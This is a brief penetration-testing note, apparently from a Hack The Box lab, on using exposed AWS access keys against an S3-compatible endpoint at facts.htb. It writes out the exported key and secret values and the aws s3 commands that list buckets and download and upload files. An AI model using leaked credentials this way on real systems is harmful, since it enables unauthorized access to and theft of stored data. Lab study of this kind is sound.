If we are exposed to AWS keys and secrets and an endpoint, we can probe it via the following

```bash
# Set env variables
export AWS_ACCESS_KEY_ID="AKIA17BC1B64E607319D"
export AWS_SECRET_ACCESS_KEY="Teaz4tVvTHqupY3g7XIa9+CtNJXqLigOK4JxhUgL"
export AWS_DEFAULT_REGION="us-east-1"

# Command general syntax
aws s3 <cmd> [s3://<bucket-name>/] [--endpoint-url http://host:port]

# List buckets
aws s3 ls --endpoint-url http://facts.htb:54321

# List contents of bucket
aws s3 ls s3://<bucket-name> --endpoint-url http://facts.htb:54321
	# List contents of sub-directory
	aws s3 ls s3://<bucket-name>/<dir>/ --endpoint-url http://facts.htb:54321

# Download files from a bucket
aws s3 cp s3://<bucket-name>/path/<filename> . --endpoint-url http://facts.htb:54321

# Upload files from a bucket
aws s3 cp localfile.txt s3://<bucket-name>/path --endpoint-url http://facts.htb:54321
```